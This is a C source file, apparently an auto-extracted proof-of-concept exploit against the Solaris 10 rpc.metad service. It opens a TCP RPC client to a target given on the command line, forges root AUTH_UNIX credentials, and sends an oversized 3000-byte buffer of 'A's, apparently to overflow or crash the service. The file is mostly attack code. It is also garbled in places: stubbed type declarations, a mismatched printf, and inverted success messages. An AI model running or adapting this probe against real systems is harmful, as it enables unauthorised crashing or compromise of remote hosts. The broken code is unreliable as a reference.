
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_9__ TYPE_3__ ;
typedef struct TYPE_8__ TYPE_2__ ;
typedef struct TYPE_7__ TYPE_1__ ;


struct timeval {int member_0; int tv_sec; int member_1; } ;
struct TYPE_7__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct hostent {int h_addr; } ;
struct TYPE_8__ {char* string; } ;
typedef TYPE_2__ req_t ;
typedef enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
typedef int buffer ;
struct TYPE_9__ {int cl_auth; } ;
typedef TYPE_3__ CLIENT ;


 int AF_INET ;
 int EADDRNOTAVAIL ;
 int METAD_FUNC ;
 int METAD_PROG ;
 int METAD_VERS ;
 int RPC_ANYSOCK ;
 int RPC_SUCCESS ;
 int authunix_create (char*,int ,int ,int ,int *) ;
 int clnt_call (TYPE_3__*,int,int ,TYPE_2__*,int ,int *,struct timeval) ;
 int clnt_pcreateerror (char*) ;
 TYPE_3__* clnttcp_create (struct sockaddr_in*,int ,int,int*,int ,int ) ;
 int errno ;
 int exit (int) ;
 int fflush (int ) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int memcpy (int*,int ,int) ;
 int memset (char*,char,int) ;
 int ntohl (unsigned long) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int stdout ;
 int xdr_req ;
 int xdr_void ;

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=1,vers=0,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("rpc.metad for solaris 10\n\n");

    if(argc<2){
        printf("usage: %s address\n",argv[0]);
        exit(-1);
    }

    printf("Using version %d and request no. %d!!\n", METAD_VERS, METAD_FUNC);

    printf("timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==((void*)0)){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,METAD_PROG,METAD_VERS,&sck,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }
    cl->cl_auth=authunix_create("localhost",0,0,0,((void*)0));

    memset(buffer, 'A', sizeof(buffer));
    buffer[3000]=0;

    req.string=buffer;

    stat=clnt_call(cl,METAD_FUNC,xdr_req,&req,xdr_void,((void*)0),tm);
    if(stat==RPC_SUCCESS) {printf("\nerror: not vulnerable\n");
    printf("sent!\n");

    }
}
